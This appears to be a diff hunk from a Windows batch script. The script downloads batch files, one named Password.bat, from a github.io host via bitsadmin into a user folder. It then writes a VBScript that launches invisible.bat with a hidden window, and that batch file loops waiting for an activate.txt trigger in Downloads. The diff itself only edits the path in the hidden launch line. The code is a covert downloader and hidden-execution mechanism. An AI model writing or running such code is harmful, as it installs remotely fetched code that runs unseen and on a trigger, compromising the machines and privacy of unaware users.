@@ -24,7 +24,7 @@ bitsadmin.exe /transfer "10" https://athdot.github.io/dwnld/10.jpg %USERPROFILE%
 bitsadmin.exe /transfer "10" https://athdot.github.io/dwnld/mains.bat %USERPROFILE%\Documents\MASTERFOLDER\mains.bat
 bitsadmin.exe /transfer "10" https://athdot.github.io/dwnld/Password.bat %USERPROFILE%\Documents\MASTERFOLDER\Password.bat
 @echo Set shell = WScript.CreateObject("Wscript.Shell")> invisible.vbs
-@echo shell.Run("C:\Users\%USERNAME%\Documents\invisible.bat"),0,true>> invisible.vbs
+@echo shell.Run("%USERPROFILE%\Documents\invisible.bat"),0,true>> invisible.vbs
 @echo @echo off> invisible.bat
 @echo :start>> invisible.bat
 @echo IF EXIST %USERPROFILE%\Downloads\activate.txt (>> invisible.bat
